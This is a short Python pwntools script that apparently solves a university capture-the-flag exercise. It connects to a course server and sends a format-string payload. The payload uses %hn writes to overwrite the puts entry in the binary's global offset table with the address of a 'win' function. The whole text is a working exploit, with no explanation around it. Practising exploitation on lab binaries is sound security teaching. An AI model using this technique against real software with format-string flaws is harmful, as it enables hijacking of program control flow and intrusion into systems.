from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 23197

s = remote(SERVER, PORT, timeout=9999)
elf = ELF("./07_call_functions")

win_address = elf.symbols["win"]
puts_address = elf.got["puts"]

s.sendline(
    p32(puts_address)
    + p32(puts_address + 2)
    + b"%37390x"
    + b"%7$hn"
    + b"%30190x"
    + b"%8$hn"
)

response = s.recvline()
print(response)
